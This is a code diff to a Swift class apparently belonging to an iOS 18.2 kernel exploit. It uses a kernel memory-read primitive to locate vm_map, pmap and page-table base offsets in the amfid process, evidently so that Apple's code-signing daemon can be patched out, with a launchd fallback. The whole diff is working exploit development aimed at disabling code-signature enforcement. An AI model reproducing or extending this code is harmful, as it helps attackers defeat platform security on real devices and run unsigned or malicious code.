@@ -216,36 +216,43 @@ final class ExpAmfidNopFinal {
             pmapOffset = 0x48
         }
         
-        guard pmap != 0 else {
-            log("❌ pmap not found at +0x40 or +0x48")
-            // The value at +0x48 (0x6bab638000) might be ttep directly!
-            let rawAt48 = ds_kread64(vmMap + 0x48)
-            if rawAt48 > 0x800000000 || (rawAt48 > 0x600000000 && rawAt48 < 0xA00000000) {
-                log("  ℹ️ vm_map+0x48 raw = 0x\(String(format:"%llx", rawAt48)) — might be ttep directly!")
-                log("  Trying pmap at +0x40, ttep from pmap...")
-            }
-            performPatchViaLaunchd(amfidPid: amfidPid)
-            return
-        }
-        log("  ✅ pmap (vm_map+0x\(String(format:"%x", pmapOffset))): 0x\(String(format:"%llx", pmap))")
+        log("  pmap40: 0x\(String(format:"%llx", pmap40))")
+        log("  pmap48 (raw): 0x\(String(format:"%llx", pmap48))")
         
-        // Scan pmap for ttep (has valid L1[4] for 0x100000000 range)
+        // On iOS 18.2 A12: vm_map+0x40 = pmap (kernel VA)
+        //                   vm_map+0x48 = ttep (PHYSICAL address, page-aligned!)
+        // The ttep is stored directly in vm_map, not inside pmap struct
+        let rawTtep = ds_kread64(vmMap + 0x48)
+        let ttepIsPhysical = rawTtep != 0 && rawTtep > 0x100000000 && rawTtep < 0xA00000000 && (rawTtep & 0xFFF) == 0
+        log("  vm_map+0x48 as ttep: 0x\(String(format:"%llx", rawTtep)) (phys=\(ttepIsPhysical))")
+        
+        // Use vm_map+0x48 as ttep if it looks physical
         var probeFoundTtep: UInt64 = 0
-        for off: UInt64 in [0x0, 0x8, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48] {
-            let val = ds_kread64(pmap + off)
-            if val == 0 { continue }
-            let isKVA = (val >> 32) > 0xFFFFFF00
-            let isPhy = val > 0x100000000 && val < 0xA00000000
-            if !isKVA && !isPhy { continue }
-            let l1 = ds_kread64(val + 4 * 8)
-            if (l1 & 0x3) == 0x3 {
-                probeFoundTtep = val
-                log("  ✅ ttep at pmap+0x\(String(format:"%x", off)): 0x\(String(format:"%llx", val))")
-                break
+        if ttepIsPhysical {
+            // Verify by reading L1[4] from this physical address
+            let l1Test = ds_kread64(rawTtep + 4 * 8)
+            log("  L1[4] test: 0x\(String(format:"%llx", l1Test)) (valid=\((l1Test & 0x3) == 0x3))")
+            if (l1Test & 0x3) == 0x3 {
+                probeFoundTtep = rawTtep
+                log("  ✅ ttep confirmed at vm_map+0x48: 0x\(String(format:"%llx", rawTtep))")
             }
         }
+        
+        // If vm_map+0x48 didn't work, try pmap+0x8 (common alternative)
+        if probeFoundTtep == 0 && pmap != 0 {
+            let pmapTtep = ds_kread64(pmap + 0x8)
+            let isPhy2 = pmapTtep != 0 && pmapTtep > 0x100000000 && pmapTtep < 0xA00000000 && (pmapTtep & 0xFFF) == 0
+            if isPhy2 {
+                let l1Test2 = ds_kread64(pmapTtep + 4 * 8)
+                if (l1Test2 & 0x3) == 0x3 {
+                    probeFoundTtep = pmapTtep
+                    log("  ✅ ttep at pmap+0x8: 0x\(String(format:"%llx", pmapTtep))")
+                }
+            }
+        }
+        
         if probeFoundTtep == 0 {
-            log("  ❌ ttep not found in pmap (no valid L1[4])")
+            log("  ❌ ttep not found")
         }
         
         // Find text base — scan vm_map for userspace address
@@ -593,35 +600,40 @@ final class ExpAmfidNopFinal {
         }
         log("  pmap: 0x\(String(format:"%llx", pmap))")
         
-        // Read ttep from pmap — scan multiple offsets
-        // On iOS 18.2, ttep may not be at pmap+0x0
+        // Read ttep — try vm_map+0x48 first (physical ttep on iOS 18.2)
+        // then pmap+0x8 as fallback
         var ttep: UInt64 = 0
-        log("  Scanning pmap for ttep...")
-        for off: UInt64 in [0x0, 0x8, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48] {
-            let val = ds_kread64(pmap + off)
-            if val == 0 { continue }
-            let isKernVA = (val >> 32) > 0xFFFFFF00
-            let isPhys = val > 0x100000000 && val < 0xA00000000
-            if !isKernVA && !isPhys { continue }
-            
-            // Check if this could be ttep: read L1[4] (for 0x100000000 range)
-            let l1Test = ds_kread64(val + 4 * 8)
-            let l1Valid = (l1Test & 0x3) == 0x3
-            log("    pmap+0x\(String(format:"%02x", off)) = 0x\(String(format:"%llx", val)) → L1[4]=0x\(String(format:"%llx", l1Test)) \(l1Valid ? "✅" : "")")
-            
-            if l1Valid && ttep == 0 {
-                ttep = val
+        log("  Scanning for ttep...")
+        
+        let rawTtep48 = ds_kread64(vmMap + 0x48)
+        let is48Phys = rawTtep48 != 0 && rawTtep48 > 0x100000000 && rawTtep48 < 0xA00000000 && (rawTtep48 & 0xFFF) == 0
+        if is48Phys {
+            let l1Test = ds_kread64(rawTtep48 + 4 * 8)
+            if (l1Test & 0x3) == 0x3 {
+                ttep = rawTtep48
+                log("  ✅ ttep at vm_map+0x48: 0x\(String(format:"%llx", ttep))")
+            }
+        }
+        
+        if ttep == 0 {
+            let pmapTtep = ds_kread64(pmap + 0x8)
+            let isPhy2 = pmapTtep != 0 && pmapTtep > 0x100000000 && pmapTtep < 0xA00000000 && (pmapTtep & 0xFFF) == 0
+            if isPhy2 {
+                let l1Test2 = ds_kread64(pmapTtep + 4 * 8)
+                if (l1Test2 & 0x3) == 0x3 {
+                    ttep = pmapTtep
+                    log("  ✅ ttep at pmap+0x8: 0x\(String(format:"%llx", ttep))")
+                }
             }
         }
         
         guard ttep != 0 else {
-            log("❌ ttep not found in pmap struct")
-            log("   No offset has valid L1 entries for userspace")
+            log("❌ ttep not found")
             fallbackToLaunchd(amfidPid: amfidPid)
             return
         }
         let ttepIsKernVA = (ttep >> 32) > 0xFFFFFF00
-        log("  ✅ ttep: 0x\(String(format:"%llx", ttep)) (\(ttepIsKernVA ? "kernVA" : "phys"))")
+        log("  ttep: 0x\(String(format:"%llx", ttep)) (\(ttepIsKernVA ? "kernVA" : "phys"))")
         
         // Get amfid's text base — scan vm_map for userspace address
         var textBase: UInt64 = 0
